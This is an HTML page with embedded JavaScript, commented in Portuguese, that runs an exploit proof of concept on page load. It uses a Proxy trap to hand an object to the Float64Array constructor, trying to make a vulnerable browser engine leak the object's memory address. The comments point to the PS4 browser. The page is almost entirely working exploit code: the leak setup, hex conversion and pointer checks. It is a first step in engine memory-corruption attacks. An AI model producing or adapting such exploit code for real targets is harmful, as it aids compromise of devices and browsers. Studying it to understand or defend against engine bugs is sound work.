<!DOCTYPE html>
<html>
<head>
    <title>Proxy Trap Type Confusion</title>
    <style>
        body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; min-height: 200px; }
        .win { color: #0f0; font-weight: bold; font-size: 1.3em; border: 1px solid #0f0; padding: 5px; }
        .fail { color: #555; }
    </style>
</head>
<body>
    <h2>Proxy Trap: Tentando Confusão de Tipos</h2>
    <p>Objetivo: Fazer o construtor tratar um Objeto como um Double.</p>
    <div id="log">Iniciando...</div>

    <script>
        function log(msg, type='') {
            const el = document.getElementById('log');
            el.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        }

        // Conversor Float64 <-> BigInt64 (Hex)
        const buf = new ArrayBuffer(8);
        const f64 = new Float64Array(buf);
        const u64 = new BigUint64Array(buf);

        function f2h(val) {
            f64[0] = val;
            let hex = u64[0].toString(16);
            return "0x" + hex.padStart(16, '0');
        }

        // O Objeto que queremos vazar o endereço
        // Pode ser qualquer coisa, mas um objeto com propriedades inline é bom
        var targetObj = {a: 1, b: 2, c: 3, d: 4}; 

        function runExploit() {
            try {
                log("1. Criando Proxy Malicioso...");

                // Este array serve apenas para enganar o JIT/Alocador
                const dummy = [1.1, 2.2, 3.3];

                const proxy = new Proxy(dummy, {
                    get(target, prop, receiver) {
                        // Se o construtor pedir o tamanho, dizemos 2
                        if (prop === "length") return 2;
                        
                        // O acesso ao índice 0 é normal
                        if (prop === "0") return 1337.0;

                        // O GOLPE (Índice 1):
                        // Quando ele pedir o segundo elemento, retornamos o OBJETO ALVO.
                        // Um motor seguro daria erro ou converteria para NaN.
                        // Um motor vulnerável grava o PONTEIRO.
                        if (prop === "1") {
                            log("   -> Trap ativado! Entregando Objeto em vez de Float...");
                            return targetObj; 
                        }

                        return Reflect.get(target, prop, receiver);
                    }
                });

                log("2. Disparando new Float64Array(proxy)...");
                
                // A mágica acontece aqui
                const arr = new Float64Array(proxy);

                log("3. Verificando resultados...");
                
                // O índice 0 deve ser 1337
                // O índice 1 deve ser NaN (seguro) ou um Ponteiro Gigante (VULNERÁVEL)
                let val0 = arr[0];
                let val1 = arr[1];

                log(`   Index 0: ${val0}`);
                log(`   Index 1: ${val1} (Hex: ${f2h(val1)})`);

                // Análise do Resultado
                if (Number.isNaN(val1)) {
                    log("[-] Falha: O objeto foi convertido para NaN corretamente.", 'fail');
                } else if (val1 === 0) {
                    log("[-] Falha: O objeto virou 0.", 'fail');
                } else {
                    // Se não é NaN e não é 0, e nós passamos um objeto...
                    // É muito provável que seja um endereço de memória!
                    let hex = f2h(val1);
                    
                    // Ponteiros de Userland no PS4 geralmente parecem com:
                    // 0x00000008xxxxxxxx (Comprimido/Estrutura) ou 0x00007fxxxxxxxxxx
                    if (hex.startsWith("0x0000")) {
                        log(`[+] JACKPOT! ISSO PARECE UM PONTEIRO: ${hex}`, 'win');
                        log("    Endereço do objeto vazado com sucesso!", 'win');
                    } else {
                        log(`[?] Resultado estranho: ${hex}. Pode ser um float comprimido?`, 'win');
                    }
                }

            } catch(e) {
                log("Erro Fatal: " + e.message);
                if (e.message.includes("Cannot convert")) {
                    log("[-] O motor bloqueou a conversão de Objeto para Número.", 'fail');
                }
            }
        }

        setTimeout(runExploit, 1000);
    </script>
</body>
</html>
